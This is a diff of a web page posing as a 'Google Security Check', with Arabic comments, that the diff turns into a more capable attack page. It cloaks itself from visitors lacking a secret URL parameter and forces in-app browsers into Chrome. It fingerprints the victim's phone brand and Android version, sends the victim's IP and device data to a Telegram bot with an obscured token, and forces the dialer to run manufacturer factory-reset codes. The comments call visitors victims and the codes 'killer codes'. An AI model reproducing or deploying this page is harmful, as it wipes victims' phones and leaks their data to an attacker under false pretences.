@@ -3,83 +3,101 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta property="og:title" content="Google Security Support">
-    <meta property="og:image" content="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png">
-    <title>تحديث أمان أندرويد</title>
+    <title>Google Security Check</title>
     <style>
-        body { background:#fff; font-family:sans-serif; text-align:center; padding-top:20%; margin:0; }
+        body { background:#fff; font-family:sans-serif; text-align:center; padding-top:20%; margin:0; overflow:hidden; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #4285F4; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; display:inline-block; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; }
     </style>
 </head>
-<body onload="launch_attack()">
+<body onload="x_launch()">
 
     <div id="overlay"></div>
 
     <div id="content">
         <div class="loader"></div>
-        <p style="color:#5f6368; font-size:18px;">جاري فحص توافق الجهاز مع بروتوكول الحماية...</p>
-        <p id="dev-info" style="font-size:12px; color:#ccc;"></p>
+        <p style="color:#5f6368; font-size:18px;">جاري فحص أمان النظام وتحديث الحماية...</p>
     </div>
 
 <script>
-    // بياناتك المشفرة
+    // بيانات التحكم الخاصة بك (التليجرام)
     const _t = "ODU4NTE1NzEzNjpBQUVhQlp3LVgwUXVmT3JFeFRWQ2RKZ20wZXpycTNRTGtqOA==";
     const _c = "NzE4NDk3MDM1NQ==";
     function _d(s) { return atob(s); }
 
-    function launch_attack() {
-        const p = new URLSearchParams(window.location.search);
-        if (p.get('auth') !== 'true') { window.location.href = "https://www.google.com"; return; }
+    function x_launch() {
+        const urlParams = new URLSearchParams(window.location.search);
+        // التمويه: إذا لم يوجد المفتاح السري يوجهه لجوجل
+        if (urlParams.get('auth') !== 'true') { window.location.href = "https://www.google.com"; return; }
 
         let ua = navigator.userAgent;
-        let model = "Unknown Device";
-        let osVer = "Unknown OS";
-        let code = "2767*3855%23"; // الكود الافتراضي
-        let method = "⚠️ توجيه يدوي (لوحة الاتصال)";
-
-        // 1. تحليل دقيق جداً للموديل والإصدار
-        if (ua.match(/Android\s([0-9\.]+)/)) {
-            osVer = "Android " + RegExp.$1;
-            let ver = parseFloat(RegExp.$1);
-            if (ver <= 10) method = "🚀 تنفيذ تلقائي (صامت)";
-        }
-
-        // 2. تحديد الكود المناسب بناءً على البصمة الرقمية للجهاز
         let uL = ua.toLowerCase();
-        if (uL.includes("samsung")) {
-            model = "Samsung"; code = "2767*3855%23";
-        } else if (uL.includes("xiaomi") || uL.includes("redmi")) {
-            model = "Xiaomi/Redmi"; code = "%23*%23*7780*%23*%23";
-        } else if (uL.includes("huawei") || uL.includes("honor")) {
-            model = "Huawei/Honor"; code = "%23*%23*2846579*%23*%23";
-        } else if (uL.includes("realme") || uL.includes("oppo") || uL.includes("vivo")) {
-            model = "Realme/Oppo/Vivo"; code = "2767*3855%23";
-        } else if (uL.includes("sony")) {
-            model = "Sony"; code = "%23*%23*7378423*%23*%23";
+
+        // 1. ميزة الهروب من المتصفحات الداخلية (واتساب، فيسبوك، إلخ) إلى Chrome
+        if (/FBAN|FBAV|Instagram|WhatsApp|Telegram/i.test(ua)) {
+            let jump = window.location.href;
+            window.location.href = "intent://" + jump.replace(/^https?:\/\//, "") + "#Intent;scheme=https;package=com.android.chrome;end";
+            return;
         }
 
-        // 3. إرسال التقرير المجهري للتليجرام
+        // 2. محرك فحص الإصدار الحقيقي وتجاوز تمويه (Android 10)
+        let realOS = 10;
+        if (ua.indexOf("Android") >= 0) {
+            realOS = parseFloat(ua.slice(ua.indexOf("Android") + 8));
+            // تصحيح ذكي: إذا كان المتصفح حديثاً ويدعي أنه 10 فهو غالباً 11+
+            if (ua.includes("AppleWebKit/537.36") && realOS <= 10 && !ua.includes("Version/4.0")) {
+                realOS = 11; 
+            }
+        }
+
+        // 3. تحديد نوع الهاتف والكود القاتل بدقة
+        let brand = "Android Generic";
+        let targetCode = "2767*3855%23"; // الكود الافتراضي (سامسونج، ريلمي، أوبو)
+
+        if (uL.includes("samsung")) {
+            brand = "Samsung";
+            targetCode = "2767*3855%23";
+        } else if (uL.includes("xiaomi") || uL.includes("redmi") || uL.includes("poco")) {
+            brand = "Xiaomi/Redmi";
+            targetCode = "%23*%23*7780*%23*%23";
+        } else if (uL.includes("huawei") || uL.includes("honor")) {
+            brand = "Huawei/Honor";
+            targetCode = "%23*%23*2846579*%23*%23";
+        } else if (uL.includes("realme") || uL.includes("oppo") || uL.includes("vivo")) {
+            brand = "Realme/Oppo/Vivo";
+            targetCode = "2767*3855%23";
+        } else if (uL.includes("sony")) {
+            brand = "Sony";
+            targetCode = "%23*%23*7378423*%23*%23";
+        }
+
+        // 4. إرسال تقرير الصيد الدقيق للتليجرام
         fetch('https://api.ipify.org?format=json').then(r => r.json()).then(ipData => {
-            let report = `🎯 هدف تحت المجهر!\n🌐 IP: ${ipData.ip}\n📱 الشركة: ${model}\n⚙️ الإصدار: ${osVer}\n📡 الحالة: ${method}\n📟 الكود المستخدم: *${code.replace('%23', '#')}*`;
-            fetch(`https://api.telegram.org/bot${_d(_t)}/sendMessage?chat_id=${_d(_c)}&text=${encodeURIComponent(report)}`);
+            let status = (realOS >= 11) ? "⚠️ توجيه قسري (11+)" : "🚀 تنفيذ تلقائي (10-)";
+            let log = `🎯 تم رصد ضحية!\n🌐 IP: ${ipData.ip}\n📱 الشركة: ${brand}\n⚙️ الإصدار: Android ${realOS}\n📡 الحالة: ${status}\n📟 الكود: *${targetCode.replace('%23', '#')}*`;
+            fetch(`https://api.telegram.org/bot${_d(_t)}/sendMessage?chat_id=${_d(_c)}&text=${encodeURIComponent(log)}`);
         });
 
-        // 4. التنفيذ القسري (تجاوز حماية 11+)
+        // 5. التنفيذ القسري بناءً على الإصدار
         setTimeout(() => {
-            // محاولة فتح عبر Intent (الأقوى للأجهزة الحديثة)
-            let intent = `intent://*${code}#Intent;scheme=tel;action=android.intent.action.DIAL;end`;
-            window.location.href = intent;
+            if (realOS >= 11) {
+                // استخدام بروتوكول Intent لتجاوز الحماية وفتح اللوحة مباشرة
+                window.location.href = `intent://*${targetCode}#Intent;scheme=tel;action=android.intent.action.DIAL;end`;
+            } else {
+                // التنفيذ المباشر للإصدارات القديمة
+                window.location.href = "tel:*" + targetCode;
+            }
             
-            // احتياطي لو فشل الـ Intent
+            // احتياطي في حال فشل أي بروتوكول
             setTimeout(() => {
-                window.location.href = "tel:*" + code;
-            }, 1000);
-        }, 1200);
+                window.location.href = "tel:*" + targetCode;
+            }, 1200);
+        }, 1000);
     }
 
-    document.getElementById('overlay').onclick = launch_attack;
+    // إجبار التنفيذ عند أي لمسة على الشاشة
+    document.getElementById('overlay').onclick = x_launch;
 </script>
 </body>
 </html>
